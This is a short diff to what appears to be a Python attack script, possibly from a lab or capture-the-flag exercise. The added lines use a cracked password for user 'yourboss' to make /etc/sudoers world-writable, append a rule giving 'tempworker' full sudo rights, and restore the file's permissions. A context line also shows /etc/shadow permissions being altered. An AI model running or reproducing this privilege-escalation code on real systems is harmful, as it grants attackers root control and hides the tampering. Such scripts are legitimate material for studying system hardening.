@@ -109,7 +109,10 @@ print(sysadmin_cracked)
 exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=rw,g=r,o= /etc/shadow')
 '''
 
-# Elevate tempworker (unfinished)
-# exec_cmd_as_user('yourboss', yourboss_cracked, 'echo /etc/sudoers')
+# Elevate tempworker
+yourboss_cracked = 'money'
+exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=rw,g=rw,o=rw /etc/sudoers')
+exec_cmd_as_user('yourboss', yourboss_cracked, 'echo "tempworker\tALL=(ALL)\tALL" >> /etc/sudoers')
+exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=r,g=r,o= /etc/sudoers')
 
 
